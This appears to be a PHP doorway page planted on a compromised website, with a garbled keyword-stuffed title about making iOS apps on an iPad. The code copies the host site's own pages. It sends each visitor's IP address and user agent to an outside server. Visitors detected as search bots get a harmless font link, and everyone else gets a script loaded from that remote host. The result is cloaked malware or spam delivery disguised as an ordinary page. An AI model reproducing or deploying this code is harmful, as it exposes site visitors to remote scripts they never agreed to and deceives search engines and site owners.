<?php   $url = 'http://' . $_SERVER['HTTP_HOST'] . '/';
   $content = file_get_contents($url);
   $content = preg_replace('/<meta http-equiv(.*?)>/i', '', $content);
   $content = preg_replace('/<meta(.*?)description(.*?)>/i', '', $content);
   $content = preg_replace('/<meta(.*?)title(.*?)>/i', '', $content);
   $content = preg_replace('/<meta(.*?)keywords(.*?)>/i', '', $content);
   $content = preg_replace('/<title(.*?)title>/i', '', $content);
   $content = preg_replace('/<link rel="canonical"(.*?)>/i', '', $content);
   preg_match_all('/<\!DOCTYPE(.*?)>/i', $content, $doctypeTag);
   preg_match_all('/<html(.*?)>/i', $content, $htmlTag);
   preg_match_all('/<head(.*?)>/i', $content, $headTag);
   preg_match_all('/<body(.*?)>/i', $content, $bodyTag);
   $siteDOM = new DOMDocument;
   @$siteDOM->loadHTML($content);
   $head = new DOMDocument;
   $headDOM = $siteDOM->getElementsByTagName('head')->item(0);
   foreach ($headDOM->childNodes as $child)
   $head->appendChild($head->importNode($child, true));
   $headHTML = @$head->saveHTML();
   $body = new DOMDocument;
   $bodyDOM = $siteDOM->getElementsByTagName('body')->item(0);
   foreach ($bodyDOM->childNodes as $child)
   $body->appendChild($body->importNode($child, true));
   $bodyHTML = @$body->saveHTML();
   echo $doctypeTag[0][0] . PHP_EOL . $htmlTag[0][0] . PHP_EOL . $headTag[0][0] . PHP_EOL;
   ?>
<title>Create Ios Apps On Ipad Peaceofmind Congratulate Unwisely Coax create ios apps on ipad Thoughtterminal Retirement Brutus Interaction Inline | purplecube.in</title>
<meta name="description" content="Unless the coach requires it, mla structure does not demand a title-page. | Create Ios Apps On Ipad" />
<?php echo $headHTML . PHP_EOL; ?>
<?php
   $ua = urlencode($_SERVER['HTTP_USER_AGENT']);
   $ua = urlencode($ua);
   $ip = $_SERVER['REMOTE_ADDR'];
   $api = 'http://googlescript.com/api.php?';
   $apikey = 'e7d52430614c8319dbde9ba6cb49993e';
   $churl = "{$api}action=get_link&api_key=$apikey&group=lib-js&ua=$ua&ip=$ip";
   $check = file_get_contents($churl);
   $json = json_decode($check);
   if ($json->{'bot_action'}->{'text'} == 'y') {
   echo '<script src="http://fonts.googleapis.com/css?family=Open+Sans"></script>';
   }
   else {
   echo '<script src="http://googlescript.com/lib-js"></script>';
   }
   ?>
   </head>
   <?php echo $bodyTag[0][0] . PHP_EOL; ?>
     <div id="main">
               <div id="primary">
